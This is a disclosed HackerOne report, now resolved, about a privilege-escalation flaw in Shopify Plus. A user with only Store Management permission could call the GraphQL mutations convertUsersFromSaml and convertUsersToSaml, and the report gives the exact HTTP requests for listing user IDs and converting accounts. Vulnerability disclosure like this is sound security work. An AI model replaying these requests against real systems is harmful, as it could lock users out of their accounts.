---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1084904'
original_report_id: '1084904'
title: '[h1-2102] [Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml
  - that should be limited to User Management'
weakness: Privilege Escalation
team_handle: shopify
created_at: '2021-01-22T22:34:03.863Z'
disclosed_at: '2022-04-21T22:05:18.730Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
asset_identifier: Plus Web Admin with Single Domain Feature
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- privilege-escalation
---

# [h1-2102] [Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml - that should be limited to User Management

## Metadata

- HackerOne Report ID: 1084904
- Weakness: Privilege Escalation
- Program: shopify
- Disclosed At: 2022-04-21T22:05:18.730Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
[Plus] User with Store Management Permission can Make convertUsersFromSaml/convertUsersToSaml - that should be limited to User Management Only

## Description:
User with `Store management` permission - {F1168487} only, is able to convert users account from SAML and to SAML using the graphql

## Impact
This could potentially disable the user's ability to login by unlinking their account with SAML identity provider, or by linking their account with SAML identity provider, because maybe there isn't a valid account for that victim

## Steps To Reproduce:
- As an org plus admin, visit https://shopify.plus/:org_plus_id/users/invite and invite an user to have `store management permission` - (The purpose is to enable the low-privileged user to have access to https://shopify.plus/:plus_org_id/stores/api
- Login as the low-priviledged user, and visit shopify.plus and click around until you made a valid graphql call to shopify.plus, it looks something like this `POST /34946971/stores/api HTTP/1.1`
- Make this call to figure our your domain user's ID

```http
POST /34946971/users/api HTTP/1.1
Host: shopify.plus
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
...

{"operationName":"GetAllUserIds","variables":{},"query":"query GetAllUserIds {\n  organization {\n    id\n    users {\n      edges {\n        node {\n          id\n   email       __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

- Make this call to show that you can perform `convertUsersFromSaml` or `convertUsersToSaml` as a low privileged user by replacing `REPLACE_ME` with one of the user id you got from above steps

```
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
...

{"query":"mutation{convertUsersFromSaml(organizationUserIds:[\"REPLACE_ME\"]){userErrors{message}}}"}
```

or 

```
POST /34946971/stores/api HTTP/1.1
Host: shopify.plus
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json
...

{"query":"mutation{convertUsersToSaml(userIds:[\"REPLACE_ME\"]){userErrors{message}}}"}
```


You may see this in the response for above two requests

`{"data":{"convertUsersToSaml":{"userErrors":[{"message":"Make sure the SAML authentication setting is set to specific users."}]}}}`

or 

`{"data":{"convertUsersFromSaml":{"userErrors":[{"message":"User is already an Identity user: abdulwahaab.ahmed@shopify.com"}]}}}`

It is fine, it just means the lower-privileged user has the permission to perform such actions. It would require additional SAML configuration for the org plus admin for it to fully work

## Impact

But I think this is enough to show that, user with `Store Management` permission level is able to perform two restricted GRaphql call, `convertUsersFromSaml` and `convertUsersToSaml`

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
